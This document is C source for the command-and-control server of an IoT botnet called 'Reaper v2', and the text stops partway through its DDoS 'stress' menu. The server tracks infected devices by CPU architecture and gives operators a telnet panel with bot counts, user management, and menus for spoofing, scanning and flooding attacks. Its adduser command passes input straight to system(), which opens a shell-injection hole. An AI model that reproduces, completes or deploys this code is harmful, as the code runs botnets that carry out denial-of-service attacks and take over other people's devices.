#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>

//THIS IS FOR THE DOMAIN RESOLVER
#include "resolver.h" 

#define MAXFDS 1000000

struct account {
  char user[200];
  char password[200];
  char id [200];
};
static struct account accounts[50];

struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;
} managements[MAXFDS];

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
  int total = 0, got = 1;
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
  return got;
}
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl");
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl");
    return -1;
  }
  return 0;
}


static int create_and_bind(char *port)
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n");
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0; 
        clients[events[i].data.fd].x86 = 0;
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

          clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

          int dup = 0;
          for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
          {
            if (!clients[ipIndex].connected || ipIndex == infd) continue;

            if (clients[ipIndex].ip == clients[infd].ip)
            {
              dup = 1;
              break;
            }
          }

          if (dup)
          {
            DUPESDELETED++;
            continue;
          }

          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "~ SC ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int thefd = events[i].data.fd;
        struct clientdata_t *client = &(clients[thefd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0; 
        client->mips = 0;
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
              continue;
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mx86_64\e[1;37m]") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mx86_32\e[1;37m]") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mMIPS\e[1;37m]") == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mMPSL\e[1;37m]") == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mARM4\e[1;37m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mARM5\e[1;37m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mARM6\e[1;37m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mARM7\e[1;37m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mPPC\e[1;37m]") == buf)
                        {
                          client->ppc = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mREAPER\e[1;37m] \e[1;37mDevices Loading \e[1;37m[\e[0;31mBUILD\e[1;37m] ~> [\e[0;31mSPC\e[1;37m]") == buf)
                        {
                          client->spc = 1;
                        }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0; 
                                        client->sh4 = 0;
                                        client->x86 = 0;
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected() 
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}

    void *titleWriter(void *sock) 
    {
        int thefd = (long int)sock;
        char string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Reaper v2 | IoT Devices: %d | Malware Enthusiast: %d %c", '\033', clientsConnected(), managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
            sleep(2);
        }
    }


int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("reaper.txt", "r")) == NULL) {
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
void client_addr(struct sockaddr_in addr) {
  printf("[\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("IP.log", "a");
  fprintf(logFile, "\nIP:[\x1b[0;36m%d.%d.%d.%d\x1b[1;37m] ",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}

void *telnetWorker(void *sock) {
  int thefd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char counter[2048];
  memset(counter, 0, 2048);
  char buf[2048];
  char* nickstring;
  char usernamez[80];
  char* password;
  char *admin = "admin"; 
  memset(buf, 0, sizeof buf);
  char botnet[2048];
  memset(botnet, 0, 2048);

  FILE *fp;
  int i = 0;
  int c;
  fp = fopen("reaper.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id); 
    ++j;
  }
   sprintf(botnet, "\x1b[0;31mUsername\x1b[1;37m:");
  if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
  trim(buf);
  sprintf(usernamez, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

  if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(botnet, "\x1b[0;31mPassword\x1b[1;37m:");
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
    goto reaper;
  }
failed:
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        reaper: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char reaper_1 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_2 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_3 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_4 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_5 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_6 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_7 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_8 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_9 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_10 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_11 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_12 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_13 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_14 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_15 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_16 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_17 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_18 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_19 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_20 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_21 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_22 [90000]; // We are Displaying Attempting to display main banner!
        char reaper_23 [90000]; // We are Displaying Attempting to display main banner!

        sprintf(reaper_1, "\x1b[0;31m8888888b\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_2, "\x1b[0;31m888   Y88b\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_3, "\x1b[0;31m888    888\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_4, "\x1b[0;31m888   d88P .d88b.   8888b.  88888b.   .d88b.  888d888\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_5, "\x1b[0;31m8888888P  d8P  Y8b      88b 888  88b d8P  Y8b 888P\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_6, "\x1b[0;31m888 T88b  88888888 .d888888 888  888 88888888 888\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_7, "\x1b[0;31m888  T88b Y8b.     888  888 888 d88P Y8b.     888\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_8, "\x1b[0;31m888   T88b  Y8888   Y888888 88888P     Y8888  888\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_9, "\x1b[0;31m                            888\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_10, "\x1b[0;31m                            888\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_11, "\x1b[0;31m                            888  \r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_12, "\x1b[0;31m\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_13, "\x1b[0;31m*********************************************\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_14, "\x1b[0;31m*           \x1b[1;37mWelcome To The Reaper v2        \x1b[0;31m*\r\n", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        sprintf(reaper_15, "\x1b[0;31m********************************************* \r\n"); // We are Displaying Attempting to display main banner!
        sprintf(reaper_16, "\x1b[0;31m\r\n");  // We are Displaying Attempting to display main banner!
        sprintf(reaper_17,  "\x1b[0;31mSelect An Option:\r\n"); // We are Displaying Attempting to display main banner!
        sprintf(reaper_18,  "\x1b[0;37m[\x1b[1;32mHELP\x1b[0;37m] -\x1b[1;37mShows Attack Commands\r\n"); // We are Displaying Attempting to display main banner!
        sprintf(reaper_19,  "\x1b[0;37m[\x1b[1;33mRULES\x1b[0;37m] -\x1b[1;37mShow T.O.S Of ReaperNet\r\n"); // We are Displaying Attempting to display main banner!
        sprintf(reaper_20,  "\x1b[0;37m[\x1b[0;34mPORTS\x1b[0;37m] -\x1b[1;37mShows Usable Ports\r\n");; // We are Displaying Attempting to display main banner!
        sprintf(reaper_21,  "\x1b[0;37m[\x1b[0;35mSTRESS\x1b[0;37m] -\x1b[1;37mShows Boot Tutorial\r\n");; // We are Displaying Attempting to display main banner!
        sprintf(reaper_22,  "\x1b[0;37m[\x1b[1;36mEXTRA\x1b[0;37m] -\x1b[1;37mShows Something For Skidz\r\n");; // We are Displaying Attempting to display main banner!
        sprintf(reaper_23,  "\x1b[1;37mLogged In As:\x1b[0;31m %s\x1b[0;37m\r\n", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_1, strlen(reaper_1), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_2, strlen(reaper_2), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_3, strlen(reaper_3), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_4, strlen(reaper_4), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_5, strlen(reaper_5), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_6, strlen(reaper_6), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_7 , strlen(reaper_7), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_8 , strlen(reaper_8), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_9 , strlen(reaper_9), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_10 , strlen(reaper_10), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_11 , strlen(reaper_11), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_12 , strlen(reaper_12), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_13 , strlen(reaper_13), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_14 , strlen(reaper_14), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_15 , strlen(reaper_15), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!  
        if(send(thefd, reaper_16 , strlen(reaper_16), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_17 , strlen(reaper_17), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_18 , strlen(reaper_18), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_19 , strlen(reaper_19), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_20 , strlen(reaper_20), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!  
        if(send(thefd, reaper_21 , strlen(reaper_21), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_22 , strlen(reaper_22), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, reaper_23 , strlen(reaper_23), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        while(1) 
        { // We are Displaying Attempting to display main banner!
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        break; // World Break!
        } // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        managements[thefd].connected = 1; // We are Displaying Attempting to display main banner!

        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
          if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "COUNT") || strstr(buf, "count")) {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
      char total[128];
      char mips[128];
      char sh4[128];
      char arm[128];
      char ppc[128];
      char x86[128];
      char spc[128];
      sprintf(mips,  "\x1b[0;31mreaper.mips \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", mipsConnected());
      sprintf(arm,   "\x1b[0;31mreaper.arm  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", armConnected());
      sprintf(sh4,   "\x1b[0;31mreaper.sh4  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", sh4Connected());
      sprintf(ppc,   "\x1b[0;31mreaper.ppc  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", ppcConnected());
      sprintf(x86,   "\x1b[0;31mreaper.x86  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", x86Connected());
      sprintf(spc,   "\x1b[0;31mreaper.spc  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", spcConnected());
      sprintf(total, "\x1b[0;31mreaper.ttl  \x1b[1;37m[\x1b[0;31m%d\x1b[1;37m]\r\n", clientsConnected());
      if (send(thefd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
      }
        else
      {
        sprintf(botnet, "\x1b[1;37mYou Dont Have Permission To Use This\x1b[0;31m!\x1b[1;37m\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }  
              if (strstr(buf, "resolve") || strstr(buf, "RESOLVE")) {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
      char *ip[100];
      char *token = strtok(buf, " ");
      char *url = token+sizeof(token);
      trim(url);
      resolve(url, ip);
          sprintf(botnet, "Resolved \x1b[1;37m[\x1b[0;31m%s\x1b[1;37m] to \x1b[1;37m[\x1b[0;31m%s\x1b[1;37m]\r\n", url, ip);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        sprintf(botnet, "\x1b[1;37mYou Dont Have Permission To Use This\x1b[0;31m!\x1b[1;37\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
    {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
        char *token = strtok(buf, " ");
        char *userinfo = token+sizeof(token);
        trim(userinfo);
        char *uinfo[50];
        sprintf(uinfo, "echo '%s' >> reaper.txt", userinfo);
        system(uinfo);
        printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, userinfo);
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\r\n", accounts[find_line].user, userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        sprintf(botnet, "\x1b[1;37mYou Dont Have Permission To Use This\x1b[0;31m!\x1b[1;37\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }
        if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help"))  {
        char help_cmd1  [5000];
        char help_line1  [5000];
        char help_coms1  [5000];
        char help_coms2  [5000];
        char help_coms3  [5000];
        char help_coms4  [5000];
        char help_coms6  [5000];
        char help_coms7  [5000];
        char help_coms8  [5000];
        char help_coms9  [5000];
        char help_line3  [5000];

        sprintf(help_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]All Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(help_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(help_coms1, "\x1b[0;37m[\x1b[1;31mClear Screen\x1b[1;37m]         CLEAR\r\n");
        sprintf(help_coms2, "\x1b[1;37m[\x1b[1;32mLOGOUT\x1b[1;37m]               LOGOUT\r\n");
        sprintf(help_coms3, "\x1b[1;37m[\x1b[1;33mUsable Ports\x1b[1;37m]         PORTS\r\n");
        sprintf(help_coms4, "\x1b[1;37m[\x1b[1;34mRules\x1b[1;37m]                RULES\r\n");
        sprintf(help_coms6, "\x1b[1;37m[\x1b[1;36mSpoofing Methods\x1b[1;37m]     SPOOF\r\n");
        sprintf(help_coms7, "\x1b[1;37m[\x1b[0;31mSpecial Commands\x1b[1;37m]     SPECIA\r\n");
        sprintf(help_coms8, "\x1b[1;37m[\x1b[1;32mScanning Commands\x1b[1;37m]    REAPER\r\n");
        sprintf(help_coms9, "\x1b[1;37m[\x1b[1;33mStressing Commands\x1b[1;37m]   STRESS\r\n");
        sprintf(help_line3, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");

        if(send(thefd, help_cmd1, strlen(help_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line1, strlen(help_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms1, strlen(help_coms1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms2, strlen(help_coms2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms3, strlen(help_coms3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms4, strlen(help_coms4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms6, strlen(help_coms6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms7, strlen(help_coms7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms8, strlen(help_coms8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_coms9, strlen(help_coms9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line3, strlen(help_line3),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "STRESS") || strstr(buf, "stress") || strstr(buf, "ddos") || strstr(buf, "DDOS")) 
        {
        char stress_cmd1  [5000];
        char stress_line1  [5000];
        char stress_udp1  [5000];
        char stress_udp2  [5000];
        char stress_udp3  [5000];
        char stress_udp4  [5000];
        char stress_line2  [5000];

        sprintf(stress_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m] Method Listings\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(stress_line1, "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(stress_udp1,  "\x1b[1;37m[\x1b[0;31mLayer4 UDP\x1b[1;37m]               L4UDP  \r\n");
